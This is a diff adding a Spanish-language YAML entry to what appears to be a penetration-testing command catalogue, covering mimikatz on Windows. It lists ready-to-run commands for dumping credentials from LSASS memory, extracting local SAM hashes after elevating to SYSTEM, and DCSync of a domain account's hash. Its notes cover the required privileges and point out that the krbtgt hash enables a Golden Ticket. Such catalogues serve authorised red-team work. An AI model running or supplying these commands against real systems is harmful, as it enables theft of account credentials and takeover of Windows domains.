@@ -1,0 +1,41 @@
+# Comandos de mimikatz: volcado de credenciales de la memoria de Windows (se ejecuta EN el objetivo).
+tool: mimikatz
+area: ad
+url: https://github.com/gentilkiwi/mimikatz
+commands:
+  - id: mimikatz-logonpasswords
+    title: Credenciales de la memoria (LSASS)
+    cmd: |
+      mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+    phase: credential-access
+    os: [windows]
+    tags: [credential-dumping, ntlm]
+    notes: >-
+      Lee LSASS y saca hashes NT, tickets y, en sistemas antiguos o con WDigest activo, contraseñas
+      en claro de las sesiones abiertas. privilege::debug necesita administrador local; da error 20
+      si no lo eres. Como one-liner ejecuta cada orden entre comillas y sale.
+    refs: [https://github.com/gentilkiwi/mimikatz]
+
+  - id: mimikatz-sam
+    title: Volcar los hashes de la SAM local
+    cmd: |
+      mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
+    phase: credential-access
+    os: [windows]
+    tags: [credential-dumping, ntlm]
+    notes: >-
+      Hashes NTLM de las cuentas locales del equipo. token::elevate sube a SYSTEM, necesario para
+      leer la SAM. lsadump::secrets saca además los secretos LSA (contraseñas de servicios).
+    refs: [https://github.com/gentilkiwi/mimikatz]
+
+  - id: mimikatz-dcsync
+    title: "DCSync: hash de una cuenta sin tocar el DC"
+    cmd: |
+      mimikatz.exe "lsadump::dcsync /domain:{{DOMAIN}} /user:Administrator" exit
+    phase: credential-access
+    os: [windows]
+    tags: [credential-dumping, dcsync, ntlm]
+    notes: >-
+      Pide la replicación del hash de una cuenta haciéndose pasar por un DC. Requiere derechos de
+      replicación (los tiene Domain Admins). /user:krbtgt da la base para un Golden Ticket.
+    refs: [https://github.com/gentilkiwi/mimikatz]
